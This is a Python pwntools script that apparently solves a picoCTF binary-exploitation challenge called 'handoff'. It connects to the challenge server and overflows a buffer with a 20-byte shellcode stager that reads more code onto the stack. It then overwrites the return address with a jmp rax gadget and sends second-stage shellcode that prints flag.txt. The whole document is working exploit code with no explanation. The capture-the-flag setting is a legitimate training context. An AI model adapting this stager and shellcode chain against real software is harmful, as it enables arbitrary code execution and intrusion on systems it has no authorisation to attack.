from pwn import *

context.binary = './handoff'
context.arch = 'amd64'

HOST = 'shape-facility.picoctf.net'
PORT = 49185

OFFSET = 20
JMP_RAX = 0x40116c

p = remote(HOST, PORT)

stager = (
    b'\xeb\x06' +
    b'\x90' * 5 +
    b'X' +
    asm('''
        xor edi, edi
        mul edi
        push rsp
        pop rsi
        mov dl, 0x7f
        syscall
        jmp rsp
    ''')
)

print("stager len =", len(stager))
assert len(stager) == 20

payload = stager + p64(JMP_RAX)

p.sendlineafter(b'What option would you like to do?', b'3')
p.recvuntil(b'appreciate it:')
p.sendline(payload)

p.clean(timeout=0.2)

stage2 = asm(shellcraft.cat('flag.txt'))
stage2 += asm(shellcraft.exit(0))

p.send(stage2)

data = p.recvall(timeout=5)
print(repr(data))
print(data.decode(errors='ignore'))
